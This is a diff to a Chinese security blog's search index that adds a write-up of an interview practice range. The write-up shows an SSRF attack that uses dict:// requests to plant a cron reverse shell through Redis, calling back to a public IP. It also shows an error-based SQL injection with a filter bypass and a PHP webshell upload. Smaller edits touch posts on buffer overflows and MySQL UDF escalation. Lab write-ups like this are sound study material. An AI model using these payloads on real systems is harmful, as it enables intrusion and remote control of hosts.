@@ -1,6 +1,92 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>记录一下面试打的靶场</title>
+    <url>/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<p>面试打靶场，时先三天，周五开始，干到半夜三点，周六一天脑子蒙的，熬夜真的巨难受（周四熬夜打群星，没想到周五面试又要熬夜QAQ），周六肝了一天什么思路都没有，晚上10点就睡了，睡了8，9个小时，周日起床一早上拿了三个flag，只能说熬夜不适合我。周日下午又来了一个面试，就不想打了。一共提交了4个flag不知道能不能过。</p>
+<span id="more"></span>
+
+<p>Web1 flag3</p>
+<p>由页面与命令判断存在ssrf</p>
+<p>​                   <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305165915254.png" alt="image-20230305165915254">            </p>
+<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170002207.png" alt="image-20230305170002207"></p>
+<p>得到ip: 172.19.240.5</p>
+<p>尝试爆破c段</p>
+<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170015487.png" alt="image-20230305170015487"></p>
+<p>1</p>
+<p>5</p>
+<p>7</p>
+<p>本机：172.19.240.5</p>
+<p>存活：</p>
+<p>172.19.240.1 端口：6379，80</p>
+<p>172.19.240.7 端口：6379</p>
+<p>172.19.240.7思路：</p>
+<p>6379为redis默认端口，试试未授权</p>
+<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170029354.png" alt="image-20230305170029354"></p>
+<p>写入shell</p>
+<p>dict:&#x2F;&#x2F;172.19.240.7:6379&#x2F;flushall </p>
+<p>dict:&#x2F;&#x2F;172.19.240.7:6379&#x2F;config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F; </p>
+<p>dict:&#x2F;&#x2F;172.19.240.7:6379&#x2F;config set dbfilename root</p>
+<p>dict:&#x2F;&#x2F;172.19.240.7:6379&#x2F;set x “\n* * * * * &#x2F;bin&#x2F;bash -i &gt;%26 &#x2F;dev&#x2F;tcp&#x2F;39.106.17.48&#x2F;8888 0&gt;%261\n”</p>
+<p>dict:&#x2F;&#x2F;172.19.240.7:6379&#x2F;save</p>
+<p>设置监听 （内网收不到，嫖了阿里云一个月的靶场，真不错）</p>
+<p><img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170107998.png" alt="image-20230305170107998"></p>
+<p>成功</p>
+<p>Web1 flag2</p>
+<p>收集信息</p>
+<p>根据提示直接</p>
+<p><strong>dict:&#x2F;&#x2F;172.19.240.7:6379&#x2F;get flag</strong></p>
+<p><img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170153443.png" alt="image-20230305170153443"></p>
+<h2 id="Web1-FLAG1"><a href="#Web1-FLAG1" class="headerlink" title="Web1-FLAG1"></a>Web1-FLAG1</h2><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><p>Web5-FLAG1</p>
+<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170202200.png" alt="image-20230305170202200"></p>
+<p>Web5-FLAG1</p>
+<p>7kbscan扫出302</p>
+<p><a href="http://43.137.0.21:8082/admin/login.php">http://43.137.0.21:8082/admin/login.php</a></p>
+<p>得到登录页面</p>
+<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170251168.png" alt="image-20230305170251168"></p>
+<p>尝试弱密码</p>
+<p>失败</p>
+<p>爆破</p>
+<p>失败</p>
+<p>Sql注入</p>
+<p>有报错，有过滤</p>
+<p>双写绕过</p>
+<p>尝试写入shell</p>
+<p>失败</p>
+<p>Ini中限制文件写入</p>
+<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170258216.png" alt="image-20230305170258216"></p>
+<p>根据报错编写</p>
+<p>admin’ an and d extractvalue(1,concat(0x7e,(selselectect admin_name fro from m bees_admin limit 0,1),0x7e))#</p>
+<p>拿到</p>
+<p>账户：meetsec</p>
+<p>Cmd5解密</p>
+<p>密码：login123</p>
+<p>登录</p>
+<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170305760.png" alt="image-20230305170305760"></p>
+<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170310168.png" alt="image-20230305170310168"></p>
+<p>发现有上传</p>
+<p>尝试</p>
+<p><a href="http://43.137.0.21:8082/admin/admin_file_upload.php">http://43.137.0.21:8082/admin/admin_file_upload.php</a> <a href="http://43.137.0.21:8082/admin/upload.php">http://43.137.0.21:8082/admin/upload.php</a></p>
+<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170316675.png" alt="image-20230305170316675"></p>
+<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170322139.png" alt="image-20230305170322139"></p>
+<p>application&#x2F;x-zip-compressed</p>
+<p>不知道为什么后面可以直接传php了</p>
+<p>于是传一句话</p>
+<p>蚁剑连接</p>
+<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170326203.png" alt="image-20230305170326203"></p>
+<p>Getflag</p>
+<h2 id="Web6-FLAG1"><a href="#Web6-FLAG1" class="headerlink" title="Web6-FLAG1"></a>Web6-FLAG1</h2><p><img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170342495.png" alt="image-20230305170342495"></p>
+<p>是一个tomcat10，扫了一下是个登录框，试了一下弱口令，不行，肝不动了，结束打靶场</p>
+]]></content>
+      <categories>
+        <category>实验</category>
+      </categories>
+      <tags>
+        <tag>随笔</tag>
+        <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>如何理解溢出漏洞</title>
     <url>/2023/03/01/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h2 id="如何理解缓冲区溢出？"><a href="#如何理解缓冲区溢出？" class="headerlink" title="如何理解缓冲区溢出？"></a>如何理解缓冲区溢出？</h2><p><strong>缓冲区溢出</strong>（buffer overflow），在<a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6%E5%AD%B8">电脑学</a>上是指针对<a href="https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1">程序设计</a>缺陷，向程序输入<a href="https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA">缓冲区</a>写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并取得程序乃至系统的控制权。</p>
@@ -57,6 +143,8 @@
 <p>​		<img src="/2023/03/01/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/10184650-e012f76a285a430da70e67128de2674e.jpg" alt="img"></p>
 <p>​		通过计算返回地址内存区域相对于buffer的偏移，并在对应位置构造新的地址指向buffer内部二进制代码的其实位置，便能执行用户的自定义代码！这段既是代码又是数据的二进制数据被称为shellcode，因为攻击者希望通过这段代码打开系统的shell，以执行任意的操作系统命令——比如下载病毒，安装木马，开放端口，格式化磁盘等恶意操作。</p>
 <h2 id="借助跳板的栈溢出方式"><a href="#借助跳板的栈溢出方式" class="headerlink" title="借助跳板的栈溢出方式"></a>借助跳板的栈溢出方式</h2><p>​		操作系统每次加载可执行文件到进程空间的位置都是无法预测的，因此栈的位置实际是不固定的，通过硬编码覆盖新返回地址的方式并不可靠。为了能准确定位shellcode的地址，需要借助一些额外的操作，其中最经典的是借助跳板的栈溢出方式。</p>
+<p>↓↓↓往下涉及知识盲区，以后学完再来看</p>
+<p><a href="https://www.cnblogs.com/fanzhidongyzby/p/3250405.html">https://www.cnblogs.com/fanzhidongyzby/p/3250405.html</a></p>
 <p>参考文章：</p>
 <p><a href="https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA">https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA</a></p>
 <p><a href="https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/15573423?fromModule=lemma_inlink">https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/15573423?fromModule=lemma_inlink</a></p>
@@ -166,8 +254,10 @@
 <td align="center">必须导出到MySQL安装目录下的lib\plugin文件夹下（<strong>一般Lib、Plugin文件夹需要手工建立（可用NTFS ADS流模式突破进而创建文件夹）</strong>）</td>
 </tr>
 </tbody></table>
+<p>判断代码：</p>
+<p><code>select version();</code></p>
 <h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p><strong>1、获取Mysql安装路径</strong></p>
-<p>​		<code>select @basedir</code></p>
+<p>​		<code>select @@basedir;</code></p>
 <p><strong>2、查看可操作路径</strong></p>
 <p>​		<code>show global variables like &quot;%secure%&quot;</code></p>
 <p>​		若<strong>secure_file_priv</strong>值为null，表示mysql不允许导入导出，此时我们只能通过别的方法将udf.dll写入安装路径</p>
@@ -1368,7 +1458,7 @@
         <category>随笔</category>
       </categories>
       <tags>
-        <tag>随想</tag>
+        <tag>随bi</tag>
         <tag>技术分享</tag>
       </tags>
   </entry>
@@ -1391,8 +1481,8 @@
         <category>随笔</category>
       </categories>
       <tags>
-        <tag>随想</tag>
         <tag>技术分享</tag>
+        <tag>随笔</tag>
       </tags>
   </entry>
 </search>
